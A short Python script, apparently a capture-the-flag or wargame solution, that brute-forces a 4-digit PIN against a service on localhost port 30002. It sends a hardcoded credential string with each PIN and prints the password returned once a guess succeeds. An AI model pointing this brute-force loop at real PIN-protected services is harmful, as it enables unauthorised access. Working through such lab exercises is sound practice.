#!/usr/bin/env python3
# Test
import socket
import select
import sys

def main():
    if len(sys.argv) > 1:
        start = int(sys.argv[1])
    else:
        start = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('localhost', 30002))
    sock.setblocking(0)
    read_from_socket(sock)

    for i in range(start, 10000):
        pin = str(i).zfill(4)
        print('Trying %s' %(pin))
        while True:
            try:
                sock.send(('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %s\n' %(pin)).encode('utf-8'))
                break
            except BrokenPipeError:
                sock = reconnect_socket()
        while True:
            answer = read_from_socket(sock)
            if answer: break
        if not "Wrong" in answer:
            print("Password found! Pin: %s" %(pin))
            print("Password: %s" %(answer))
            break


def read_from_socket(opensock):
    answer = ""
    while True:
        ready = select.select([opensock], [], [], 0.001)
        if not ready[0]: continue;
        response = opensock.recv(1024)
        #if not response: break
        answer += response.decode('utf-8')
        return answer

def reconnect_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('localhost', 30002))
    sock.setblocking(0)
    read_from_socket(sock)
    return sock

if __name__ == "__main__":
    main()

